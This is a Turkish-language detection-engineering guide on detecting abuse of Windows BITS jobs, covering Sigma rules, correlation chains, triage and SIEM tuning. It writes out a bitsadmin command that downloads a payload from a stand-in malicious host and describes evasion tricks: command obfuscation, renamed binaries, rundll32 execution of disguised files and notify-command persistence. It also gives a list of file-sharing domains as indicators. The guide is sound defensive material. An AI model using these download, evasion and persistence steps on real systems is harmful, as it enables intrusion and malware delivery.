# BITS Jobs Abuse — Tespit

> Pratisyen notu. Saha dili. Sigma referansları: *File Download Via Bitsadmin* (d059842b-6b9d-4ed1-b5c3-5b89143c6ede), *Suspicious Download From Direct IP Via Bitsadmin* (99c840f2-2012-46fd-9141-c761987550ef), *Suspicious Download From File-Sharing Website Via Bitsadmin* (8518ed3d-f7c9-4601-a26c-f361a4256a0c), *File With Suspicious Extension Downloaded Via Bitsadmin* (5b80a791-ad9b-4b75-bcc1-ad4e1e89c200), *File Download Via Bitsadmin To A Suspicious Target Folder* (2ddef153-167b-4e89-86b6-757a9e65dcac). Hepsi `Microsoft-Windows-Sysmon` process creation (Event ID 1) tabanlı.

---

## 1. Özet: saldırı + naif tespit

Background Intelligent Transfer Service (BITS), Windows'un boşta kalan bant genişliğini kullanarak dosya indirip yükleyen meşru bir servisidir. Windows Update, SCCM/MECM, Delivery Optimization, Defender imza güncellemeleri — hepsi BITS üzerinden akar. Yani kutunun içinde, imzalı, her yerde çalışan, ağ üzerinden dosya taşıyabilen ve indirmeyi işletim sisteminin kendi servis hesabına (`svchost.exe` altında `BITS`) devredebilen bir taşıma mekanizması var. Saldırgan için bu, "living off the land" tanımının ta kendisi: yeni binary düşürmeden, PowerShell'in `Invoke-WebRequest`'i kadar gürültü çıkarmadan C2'den ikinci aşamayı çeken bir kanal. MITRE ATT&CK bunu **T1197 (BITS Jobs)** altında sınıflandırır.

Klasik kötüye kullanım komut satırından `bitsadmin.exe` ile olur: `bitsadmin /transfer job /download /priority high http://kötü/payload.exe C:\Users\Public\p.exe`. Daha sinsi olanı PowerShell'in `Start-BitsTransfer` cmdlet'i ya da doğrudan `IBackgroundCopyManager` COM arayüzüdür — bu sonuncusu `bitsadmin.exe` process'i hiç yaratmaz. Kötüye kullanımın ikinci ayağı da var: BITS bir işi indirdikten sonra `SetNotifyCmdLine` ile bir "notify command" tetikleyebilir; yani BITS aynı zamanda bir **kalıcılık (persistence)** ve **execution** mekanizmasıdır, sadece indirici değil.

Naif tespit herkesin ilk yazdığı kuraldır ve referans Sigma kurallarının ilki tam olarak budur: `Image` `\bitsadmin.exe` ile bitiyor **ve** `CommandLine` içinde `/transfer` veya `/download` (bazı varyantlarda `/create` + `/addfile`) geçiyor. Sysmon Event ID 1 üzerinde process yaratımını yakalar, çalışır, kırmızı takım denemelerinde tetiklenir. Sorun şu ki bu kural, saldırganın en tembel biçimini yakalar — ve gerçek ortamda hem çok gürültü yapar hem de kolayca atlatılır. Değer buradan sonra başlıyor.

---

## 2. Naïf tespit neden yetmez

Birincisi ve en önemlisi: **`bitsadmin.exe` process'ini izlemek, BITS kötüye kullanımını izlemek değildir.** `bitsadmin.exe` sadece bir istemci sarmalayıcıdır. Asıl işi yapan, `svchost.exe -k netsvcs -p -s BITS` altında çalışan servistir. Saldırgan `Start-BitsTransfer` kullanırsa `Image` alanı `powershell.exe` olur, `bitsadmin.exe` hiç görünmez. COM arayüzünü (`IBackgroundCopyManager`, CLSID `4991D34B-80A1-4291-83B6-3328366B9097`) doğrudan çağıran C#/C++ bir loader ya da `IBackgroundCopyManager`'ı çağıran bir VBA makrosu kullanırsa, ortada ne `bitsadmin.exe` ne de tanıdık bir komut satırı kalır. İlk kural bu üç yolun sadece birini görür. Modern loader'lar ve Cobalt Strike/ Meterpreter'ın BITS modülleri neredeyse hiç `bitsadmin.exe` çağırmaz.

İkincisi: **komut satırı obfuscation'a açıktır.** `bitsadmin` argümanları büyük/küçük harfe duyarsızdır ve kısaltılabilir. `/transfer` yerine `/TRANSFER`, `/create` + `/addfile` + `/resume` + `/complete` şeklinde çok adımlı bir dizi, ya da ortam değişkeni ile parçalanmış bir yol (`%comspec% /c set x=bitsa&& %x%dmin ...`) `EndsWith '/transfer'` mantığını rahatça deler. Sigma'nın `File Download Via Bitsadmin` kuralı `/transfer` + (`/download` veya `http`) etrafında kuruludur; çok adımlı `create/addfile/resume` iş akışını çoğu kurulum kaçırır.

Üçüncüsü — ve SOC'yi asıl yoran — **false positive selleri.** BITS meşru olarak sürekli kullanılır. Kurumsal ortamda `bitsadmin` veya `Start-BitsTransfer`'i tetikleyen meşru şeyler: SCCM istemci ajanı içerik indirirken, üçüncü parti yazılım dağıtım araçları (PDQ Deploy, Chocolatey, winget), yedekleme ajanları, bazı sürücü güncelleyiciler, kurum içi yazılım paketleme scriptleri, hatta yardım masası teknisyenlerinin elle çektiği ISO/MSI'lar. `Suspicious Download From Direct IP Via Bitsadmin` kuralı IP'ye indirmeyi şüpheli sayar ama iç ağdaki bir dağıtım sunucusuna (ör. `http://10.20.30.40/pkg.msi`) yapılan indirmeler de doğrudan IP'dir ve bunlar tamamen meşrudur. Bağlam olmadan bu kural iç dağıtım altyapısı olan her kurumda gürültü kusar.

Dördüncüsü: **naif kural niyeti değil aracı yakalar.** BITS ile `calc.exe`'yi güncelleme sunucusundan çekmekle, `pastebin`'den `.hta` çekmek arasındaki farkı `Image EndsWith bitsadmin.exe` göremez. Değer, "BITS kullanıldı mı" sorusundan "BITS **hangi bağlamda, hangi ata sahip, neyi, nereye** indirdi" sorusuna geçtiğinde ortaya çıkar. Referans kural setinin geri kalanı (dosya paylaşım sitesi, şüpheli uzantı, şüpheli hedef klasör) tam da bu bağlamı eklemeye çalışır — ama tek tek her biri hâlâ zayıf sinyaldir. Asıl güç onları birbirine bağlamakta.

---

## 3. Korelasyon zinciri (asıl değer)

BITS indirme tek başına düşük güvenli bir sinyaldir. Onu yüksek güvenli tespite çeviren şey, indirmenin **öncesi ve sonrasıdır** — yani atanın kim olduğu, indirilen şeyin ne yaptığı, ve bunların zaman içinde nasıl dizildiği. Detection engineer'ın işi tek olayı değil bu zinciri yakalamaktır.

**Zincir A — Teslimat → BITS → Execution (klasik loader):**
Gerçek bir ihlalde tipik dizi şöyle akar:
1. `winword.exe` veya `outlook.exe` bir alt process doğurur (Sysmon EID 1, `ParentImage` = Office uygulaması). Bu tek başına bile zaten şüpheli.
2. Kısa süre içinde (saniyeler-dakikalar) aynı ata zincirinden `bitsadmin.exe /transfer` veya `powershell Start-BitsTransfer` çalışır ve `%TEMP%`, `%APPDATA%`, `C:\Users\Public` veya `C:\ProgramData` altına bir dosya yazar (`Suspicious Target Folder` kuralının hedefi tam bu).
3. Sysmon EID 11 (FileCreate) o yolda yeni bir `.exe`/`.dll`/`.hta`/`.scr` görür (`File With Suspicious Extension` kuralı burada bağlanır).
4. Kısa süre sonra o yeni yazılan dosya **execute** edilir (EID 1, yeni `Image` = az önce yazılan yol). Ya da BITS'in `SetNotifyCmdLine`'ı doğrudan çalıştırır — bu durumda `ParentImage` `svchost.exe` olur ve bu **çok güçlü** bir sinyaldir çünkü meşru execution'da `svchost` seni nadiren bir kullanıcı klasöründeki binary'nin atası yapar.

Bu dört adımın **tek bir host'ta, dar bir zaman penceresinde** dizilmesi, "bitsadmin çalıştı" tekil alarmından mertebe olarak daha yüksek güvenlidir. Office atası + Public klasörüne yazım + yazılanın çalıştırılması = neredeyse hiç meşru senaryosu yoktur.

**Zincir B — BITS'i başka bir LOLBIN'e teslim:**
Olgun saldırgan indirdiği şeyi doğrudan `.exe` yapmaz; BITS ile bir `.txt`/`.log`/`.jpg` uzantılı dosya çeker (uzantı kuralını atlatmak için) ve onu ayrı bir adımda `rundll32`, `regsvr32`, `mshta` ya da `certutil` ile decode/execute eder. Korelasyon: `bitsadmin` bir `%APPDATA%\update.log` yazar → **aynı host'ta dakikalar içinde** `rundll32.exe %APPDATA%\update.log,EntryPoint` çalışır. İki zayıf sinyal (masum uzantılı BITS indirmesi + LOLBIN ile "veri dosyası" çalıştırma) bağlandığında yüksek güven doğar. Hiçbir tekil kural bunu yakalayamaz; bu bir **sequence** kuralıdır.

**Zincir C — İki host, lateral hareket bağlamı:**
En değerli korelasyon çoğu zaman tek host'u aşar. Örnek: Host-1'de bir kimlik avı sonrası BITS ile ilk indirme olur. 20 dakika sonra Host-1'den Host-2'ye SMB/WinRM ile bir bağlantı (EID 3 network / 4624 Type 3 logon Host-2'de) kurulur, ardından **Host-2'de** yeni bir `bitsadmin` işi C2'ye bağlanır. Aynı C2 IP'sinin/domaininin iki farklı host'ta BITS ile temas etmesi, tek host gürültüsünü keser: meşru SCCM her yerde aynı IP'ye gider ama meşru SCCM'nin atası Office değildir ve lateral logon zinciri yoktur. "Farklı hostta, aynı C2 göstergesi, kısa aralıkla, kullanıcı-başlatımlı ata zinciriyle" — bu üçlü kavşak gerçek ihlalin imzasıdır.

**Zincir D — Kalıcılık boyutu:**
BITS işleri varsayılan olarak 90 güne kadar askıda kalabilir ve `SetMinRetryDelay`/`SetNoProgressTimeout` ile daha da uzatılabilir. Saldırgan uzun retry aralıklı bir iş oluşturup `SetNotifyCmdLine`'ı bir payload'a bağlarsa, C2 offline'ken bile iş sabırla bekler, C2 döndüğünde indirir ve komutu çalıştırır. Bunu process telemetrisi tek başına göremez — burada **`Microsoft-Windows-Bits-Client/Operational`** kanalı devreye girer (EID 3 = job created, 59/60 = transfer başladı/tamamlandı, 16403 dahil notify komutları). Korelasyon: `bitsadmin /create` veya BITS-Client EID 3 var **ama** karşılığında makul bir süre içinde bir `/complete` yok, ya da işin `RetryDelay`'i anormal büyük → gizli askıda iş. Bunu çekmek için o operasyonel kanalı **açıkça toplamak** gerekir (bkz. bölüm 6), yoksa Sysmon EID 1 sana sadece `bitsadmin.exe`'nin bir kez çalıştığını söyler, işin hâlâ diskte beklediğini asla söylemez.

Özetle: referans kurallar birer birer "boyut" ekler (kaynak IP mı, dosya paylaşım domaini mi, uzantı ne, hedef klasör ne). Detection engineer bu boyutları **VE ata-zinciri VE takip eden execution VE ikinci host** ile çarpar. Her ek boyut false positive'i böler, güveni katlar.

---

## 4. False positive gerçeği ve triage yargısı

Sahada bu alarm ezici çoğunlukla meşru çıkar. Kıdemli analistin işi "alarm var mı" değil, "bu alarmın **bağlamı** meşru üretime mi uyuyor" ayrımıdır. Meşru üreticiler ve ayırt edici işaretleri:

- **SCCM/MECM istemcisi:** BITS'i içerik indirmek için yoğun kullanır. Ayırt edici: ata `CcmExec.exe` ya da `svchost` (BITS servisi), hedef URL kurumun dağıtım noktası (DP) FQDN'i veya iç IP aralığı, hedef klasör `C:\Windows\ccmcache`. Bu kombinasyon görünüyorsa neredeyse kesin gürültü. Beyaz listeye alınacak ilk şey budur.
- **Yazılım dağıtım araçları (PDQ, winget, Chocolatey, Intune):** Ata bilinen ajan process'idir, hedef bilinen CDN/depo domaini, hedef klasör genelde `C:\ProgramData\...` altında satıcıya özel bir dizin.
- **Yedekleme/EDR/vuln scanner ajanları:** Kendi güncelleme kanallarını BITS'e verebilir. Bilinen imzalı ata + satıcı domaini.
- **Yardım masası / mühendis elle indirmeleri:** En yanıltıcı olanı budur çünkü ata `cmd.exe`/`powershell.exe` olur, tıpkı saldırgandaki gibi. Burada ayrım kullanıcı kimliğine, saate, ve URL itibarına kayar.

Kıdemli analistin triage sırası — çoklu alarmda **önce şuna** bakar:

1. **Ata zinciri (`ParentImage`) — her şeyden önce bu.** Ata `svchost`/`CcmExec`/bilinen ajan mı, yoksa `winword`/`outlook`/`excel`/`mshta`/`wscript` mi? Office/script atası tek başına triage'ı "muhtemelen kötü"ye çevirir. `explorer.exe` atası (kullanıcı elle çalıştırdı) ise "muhtemelen yardım masası" tarafına.
2. **Hedef URL itibarı ve türü.** İç IP/FQDN → düş. Dış ham IP, yeni kayıtlı domain, ya da **dosya paylaşım domaini** (`transfer.sh`, `mega.nz`, `dropbox`, `mediafire`, `anonfiles` vb. — `File-Sharing Website` kuralının listesi) → yüksel. Kurumun BITS ile dış paylaşım sitesine gitmek için hiçbir meşru sebebi normalde yoktur.
3. **İndirilen dosyanın uzantısı ve hedef klasörü.** `%TEMP%`, `%APPDATA%\Roaming`, `C:\Users\Public`, `C:\ProgramData` köküne düşen `.exe/.dll/.scr/.hta/.ps1` → yüksel. `ccmcache`/satıcı klasörüne düşen `.msi/.cab` → düş.
4. **Takip eden davranış.** İndirilen dosya çalıştırıldı mı? Yeni network bağlantısı açtı mı? Bu, alarmı olaydan **ihlale** çeviren adımdır.

Kritik yargı: bu dört sinyalden **hiçbiri tek başına** karar verdirmez. Office atası tek başına bir eklenti güncellemesi olabilir; Public klasörü tek başına bir kurulum artığı olabilir. Ama iki-üç tanesi aynı olayda hizalanınca yanlış pozitif olasılığı çöker. Deneyimli analist "her sinyali ayrı alarm olarak kovalama, bunları tek olay etrafında topla ve **birlikte** oku" der. SOAR/notable event tarafında bunu risk-tabanlı puanlamayla (her boyut +N puan, eşik üstü tek notable) modellemek, beş ayrı gürültülü kural açmaktan kat kat verimlidir.

Bir tuning gerçeği daha: `Direct IP` kuralını iç RFC1918 aralıklarını (`10.`, `172.16-31.`, `192.168.`) hariç tutmadan açarsan, dağıtım altyapısı olan kurumda ilk gün boğulursun. Doğru hamle IP'yi tümden hariç tutmak değil, **iç IP'yi düşürüp dış ham IP'yi yükseltmek** ve dış IP + kötü ata kombinasyonunu notable yapmaktır.

---

## 5. Kaçınma → karşı-tespit (derin kedi-fare)

Saldırgan referans kuralların hepsini bilir ve dokümanda yazmayan yollarla atlatır. Her atlatmanın bir ikinci-derece tespiti vardır:

**Kaçınma 1 — `bitsadmin.exe`'yi hiç kullanma, `Start-BitsTransfer` veya COM.**
`Image EndsWith bitsadmin.exe` kuralı böyle tümden kör kalır. Karşı-tespit: (a) `Microsoft-Windows-Bits-Client/Operational` kanalını topla — bu kanal, indirmeyi hangi API başlatırsa başlatsın (bitsadmin, PowerShell, ham COM) **iş oluşturmayı** loglar. Process adı ne olursa olsun BITS işi burada görünür. (b) PowerShell tarafında ScriptBlock Logging (EID 4104) ile `Start-BitsTransfer`/`BitsTransfer` modül çağrısını yakala. (c) Ham COM için: `svchost.exe` (BITS) tarafından yaratılan çocuk process'ler ve BITS servisinin başlattığı olağandışı network bağlantıları — process telemetrisi başarısız olduğunda operasyonel kanal ve ağ katmanı devralır.

**Kaçınma 2 — Masum uzantı + gecikmeli çalıştırma.**
Saldırgan `payload.exe` yerine `data.txt`/`image.jpg` indirir, `Suspicious Extension` kuralını atlatır. Karşı-tespit: uzantıya değil **davranışa** bak. BITS ile indirilen "veri" dosyasının kısa süre sonra `rundll32/regsvr32/mshta/certutil` ile dokunulması (bölüm 3, Zincir B). Ayrıca EID 11 ile yazılan dosyanın gerçek magic byte'ı (MZ header) uzantısıyla uyuşmuyorsa — bunu bazı EDR'ler sağlar — güçlü sinyal.

**Kaçınma 3 — Meşru CDN / dosya paylaşımını taklit.**
`File-Sharing` kuralı sabit domain listesine dayanır; saldırgan listede olmayan bir paylaşım servisi, ele geçirilmiş meşru bir site, ya da GitHub/Azure/AWS gibi "iyi itibarlı" bulut depolarını kullanır. Sabit liste her zaman geriden gelir. Karşı-tespit: domainden çok **ata + hedef + sonraki davranış** üçlüsüne güven. Ata `winword` ise indirmenin GitHub'dan gelmesi onu masumlaştırmaz.

**Kaçınma 4 — Argüman obfuscation ve çok adımlı iş.**
`/transfer` yerine `/create`+`/addfile`+`/setnotifycmdline`+`/resume` dizisi, harf karışımı, ortam değişkeni parçalama. Karşı-tespit: kuralı tek anahtar kelimeye (`/transfer`) bağlama; `bitsadmin` **image**'ini gördüğün her yerde (argümandan bağımsız) düşük puanlı bir sinyal üret, sonra bağlamla yükselt. `SetNotifyCmdLine`/`/SetNotifyCmdLine` argümanının varlığı **başlı başına** yüksek değerli bir avlama sinyalidir çünkü meşru elle kullanımda neredeyse hiç görülmez — bu, BITS'i execution/persistence olarak kullandığının açık işaretidir.

**Kaçınma 5 — "Yaşayan" job ile gizli kalıcılık.**
Saldırgan uzun retry aralıklı bir iş bırakır (bölüm 3, Zincir D), process telemetrisi olay bittikten sonra hiçbir şey görmez. Karşı-tespit: periyodik olarak `bitsadmin /list /allusers` çıktısını ya da BITS-Client operasyonel kanalını tarayarak **anormal uzun ömürlü/askıda işleri** ve `NOTIFICATION_CMD_LINE` bayrağı set edilmiş işleri avla. Bu bir "alarm" değil, düzenli **threat hunt**'tır; gerçek dünyada BITS kalıcılığını yakalamanın tek güvenilir yolu budur.

**Kaçınma 6 — LOLBIN'i başka LOLBIN ile zincirleme.**
BITS indir → `certutil -decode` → `rundll32` çalıştır. Her adım ayrı ayrı zayıf. Karşı-tespit: bunları ata-çocuk zinciri olarak modelle; `bitsadmin`/BITS servisiyle başlayıp kısa pencerede `certutil`/`rundll32`/`regsvr32`'ye uzanan **process ağacı** tek olay olarak puanlanmalı.

Kedi-fare özeti: her tekil kural atlatılabilir çünkü tekil kural bir **artefaktı** izler. Atlatılamayan şey davranışsal **niyettir** — "dışarıdan bir şey çekildi, kullanıcı/Office bağlamında, ve hemen ardından çalıştırıldı". Karşı-tespit hep artefakttan davranışa kayar.

---

## 6. SIEM / saha gerçeği

**Field mapping tuzakları.** Referans kurallar Sysmon EID 1 field adlarını (`Image`, `CommandLine`, `ParentImage`, `OriginalFileName`) kullanır. Ama telemetri kaynağın Sysmon değilse eşleme kayar:
- **Windows Security EID 4688** ile process yakalıyorsan `Image` yok, `NewProcessName` var; `CommandLine` ancak `Include command line in process creation events` audit ayarı **açıksa** gelir — varsayılan **kapalıdır**. Bu ayar kapalıyken 4688 tabanlı BITS kuralın komut satırını hiç görmez, yani `/transfer`/`/download` mantığı çalışmaz. Çoğu ortamda gizli kör nokta budur.
- **EDR normalize şemaları** (Defender for Endpoint `DeviceProcessEvents`, CrowdStrike, SentinelOne) kendi field adlarını kullanır (`FileName`, `ProcessCommandLine`, `InitiatingProcessFileName`). Sigma'yı doğrudan kopyalayıp yapıştırırsan `Image EndsWith` hiçbir şey döndürmez; backend'e (pipeline/field mapping) göre çevirmek şart.
- **`OriginalFileName`** kritiktir: saldırgan `bitsadmin.exe`'yi `svchost.exe` olarak yeniden adlandırırsa `Image EndsWith bitsadmin.exe` deler, ama PE'nin `OriginalFileName` alanı hâlâ `bitsadmin.exe`'dir. Sysmon bunu verir; kuralı `Image` **veya** `OriginalFileName` üzerinden yazmak yeniden-adlandırma kaçınmasını kapatır. Naif kurallar bunu çoğu zaman atlar.

**Varsayılan loglanmayanlar — sart olan konfig.**
- **`Microsoft-Windows-Bits-Client/Operational`** kanalı varsayılan olarak *etkindir ama toplanmaz.* Onu forwarder/WEF aboneliğine ya da EDR log toplayıcıya açıkça eklemezsen, `Start-BitsTransfer`/COM tabanlı ve gizli-askıda-iş senaryolarının hiçbirini göremezsin. Bu, BITS avcılığının en çok ihmal edilen tek log kaynağıdır.
- **Sysmon config:** process creation (EID 1) çoğu iyi config'de vardır ama **EID 11 (FileCreate)** ve **EID 3 (NetworkConnect)** gürültü diye sık sık daraltılır/kapatılır. Zincir A ve B, EID 11 olmadan (indirilen dosyanın yazımı) ve EID 3 olmadan (C2 bağlantısı) yarım kalır. BITS için Sysmon config'in FileCreate'i en azından kullanıcı-yazılabilir yollarda (`\Users\`, `\ProgramData\`, `\Temp\`) toplaması gerekir.
- **PowerShell:** `Start-BitsTransfer` yolunu kapatmak için ScriptBlock Logging (EID 4104) ve Module Logging şart; ikisi de varsayılan kapalıdır ve GPO ile açılır.
- **Command line audit:** 4688 kullanıyorsan komut satırı audit'ini açmadan BITS kuralları işlevsizdir.

**Platform farkları (Splunk vs Sentinel vs Elastic).**
- **Splunk:** Sysmon `XmlWinEventLog`'tan geliyorsa field extraction'a dikkat — `CommandLine` bazen tek alanda gelmez, `props/transforms` ile çıkarman gerekir. Korelasyon zincirlerini (bölüm 3) `transaction` yerine `stats` + zaman pencereli `streamstats`/`bin` ile kurmak performans açısından şarttır; `transaction` büyük hacimde çöker. Risk-tabanlı puanlama için RBA (Risk-Based Alerting) framework'ü BITS gibi "tek başına zayıf, birlikte güçlü" sinyaller için biçilmiş kaftandır.
- **Sentinel:** KQL ile `DeviceProcessEvents` ve `DeviceNetworkEvents`'i `join` etmek doğal; sequence korelasyonu için `join kind=inner` + zaman filtreli pencere iyi çalışır. Ama `SecurityEvent` (4688) tablosundan gidiyorsan yine command-line audit gerekir. BITS-Client kanalını Sentinel'e almak için AMA/DCR ile o event log'u açıkça toplamalısın; varsayılan Windows Security/Sysmon DCR'ı onu kapsamaz.
- **Elastic:** ECS eşlemesinde `process.name`, `process.command_line`, `process.parent.name`, `process.pe.original_file_name` kullanılır; Sigma'nın `Image`'i ECS'te `process.name`/`process.executable` olur. EQL sequence sorguları (`sequence by host.id with maxspan=5m`) bölüm 3'teki zincirleri yazmak için en doğal araçtır — Zincir A/B tam da EQL sequence'in güçlü olduğu yer.

**Tuning gerçeği.** Bu kural setini "aç ve unut" yapamazsın. Pratik sıra: (1) Önce `bitsadmin`/BITS-Client'i **1-2 hafta baseline** modunda topla, meşru üreticileri (SCCM DP FQDN'leri, ajan atalar, iç IP aralıkları) çıkar. (2) O baseline'ı allowlist'e çevir, **hariç tutmayı ata + hedef kombinasyonuna bağla** (sadece hedefe değil — saldırgan meşru domaine gidebilir, ama meşru ata ile gitmesi zordur). (3) Tekil kuralları düşük-puanlı sinyallere indir, notable'ı bölüm 3-4'teki çok-boyutlu birleşime kaydır. (4) BITS-Client kanalıyla düzenli **hunt** yap; askıda iş ve `SetNotifyCmdLine` avı alarmla değil avlamayla yakalanır.

Son söz: BITS kötüye kullanımında değer, `bitsadmin.exe`'yi görmekte değil — onun **ne kadar sık meşru olduğunu** bilmekte, ve meşru gürültüden gerçek niyeti ata zinciri + hedef + sonraki execution'ı bağlayarak süzmekte. Tekil imza avcıya kapı açar; ihlali kapatan şey korelasyon ve yargıdır.
